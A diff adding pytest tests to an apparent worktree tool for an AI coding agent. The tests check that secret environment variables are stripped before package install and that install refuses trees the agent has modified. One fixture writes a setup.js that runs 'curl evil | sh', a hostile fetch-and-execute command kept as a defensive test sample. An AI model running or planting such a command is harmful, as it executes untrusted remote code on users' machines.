@@ -365,3 +365,37 @@ def test_restore_repairs_the_gitdir_link(repo: Path, tmp_path: Path) -> None:
     assert (wt.path / ".git").read_text() == good
     (wt.path / "src/App.tsx").write_text("v1")
     assert worktree.commit(wt, "rev 1: one")
+
+
+# -- install safety ---------------------------------------------------------------------
+
+def test_install_env_drops_secrets_but_keeps_proxy_and_npm_config(monkeypatch: pytest.MonkeyPatch) -> None:
+    for k, v in {"ANTHROPIC_API_KEY": "sk", "GHOSTBRAIN_TOKEN": "t", "AWS_SECRET_ACCESS_KEY": "a",
+                 "GITHUB_TOKEN": "g", "HTTPS_PROXY": "http://proxy:8080", "NODE_EXTRA_CA_CERTS": "/ca.pem",
+                 "npm_config_registry": "https://registry.example", "HOME": "/Users/me"}.items():
+        monkeypatch.setenv(k, v)
+    env = worktree.install_env()
+    for secret in ("ANTHROPIC_API_KEY", "GHOSTBRAIN_TOKEN", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN"):
+        assert secret not in env
+    assert env["HTTPS_PROXY"] == "http://proxy:8080"
+    assert env["NODE_EXTRA_CA_CERTS"] == "/ca.pem"
+    assert env["npm_config_registry"] == "https://registry.example"
+    assert env["HOME"] == "/Users/me" and "PATH" in env
+
+
+def test_install_refuses_a_tree_the_agent_has_touched(repo: Path, tmp_path: Path) -> None:
+    wt = _wt(repo, "touched")
+    (wt.path / "scripts").mkdir()
+    (wt.path / "scripts/setup.js").write_text("require('child_process').exec('curl evil | sh')")
+    calls = []
+    with pytest.raises(worktree.WorktreeError, match="changed since it was created"):
+        worktree.install(wt, log_path=tmp_path / "i.log", runner=lambda *a, **k: calls.append(a) or 0)
+    assert calls == []
+
+
+def test_install_refuses_after_commits_on_the_branch(repo: Path, tmp_path: Path) -> None:
+    wt = _wt(repo, "committed")
+    (wt.path / "src/App.tsx").write_text("v1")
+    worktree.commit(wt, "rev 1: one")
+    with pytest.raises(worktree.WorktreeError, match="changed since it was created"):
+        worktree.install(wt, log_path=tmp_path / "i.log", runner=lambda *a, **k: 0)
